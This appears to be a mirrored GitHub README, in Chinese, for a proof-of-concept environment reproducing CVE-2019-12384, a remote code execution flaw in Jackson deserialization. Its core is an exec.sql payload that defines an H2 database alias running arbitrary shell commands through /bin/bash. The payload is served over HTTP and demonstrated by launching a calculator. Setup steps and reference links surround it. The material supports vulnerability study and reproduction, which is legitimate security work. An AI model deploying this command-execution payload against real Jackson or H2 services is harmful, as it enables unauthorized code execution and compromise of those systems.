# Jackson_RCE-CVE-2019-12384

CVE-2019-12384 漏洞测试环境

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/MagicZer0](https://github.com/MagicZer0) |
| Url      | [https://github.com/MagicZer0/Jackson_RCE-CVE-2019-12384](https://github.com/MagicZer0/Jackson_RCE-CVE-2019-12384)                                               |
| Stars    | 21                                                          |
| License  | Apache License 2.0                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# 环境搭建

将项目导入到idea，再配置好maven之后设置自动导入依赖库，然后在本地的web空目录写入如下文件，保存为exec.sql。并启动一个http server：

```
CREATE ALIAS SHELLEXEC AS $ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"/bin/bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\0A");
    return s.hasNext() ? s.next() : "";  }
$;
CALL SHELLEXEC('open /Applications/Calculator.app')
```

请注意修改代码中对应的部分，适配不同的操作系统环境。

# 运行结果

可以看到弹出计算器。

# 漏洞参考

https://blog.doyensec.com/2019/07/22/jackson-gadgets.html

https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

https://www.anquanke.com/post/id/182695



## Get the content

```
git clone https://github.com/MagicZer0/Jackson_RCE-CVE-2019-12384
cd Jackson_RCE-CVE-2019-12384
```

{% embed url="https://github.com/MagicZer0/Jackson_RCE-CVE-2019-12384" %}

<figure><img src="https://avatars.githubusercontent.com/u/19569793?v=4" alt=""><figcaption><p>MagicZer0</p></figcaption></figure>
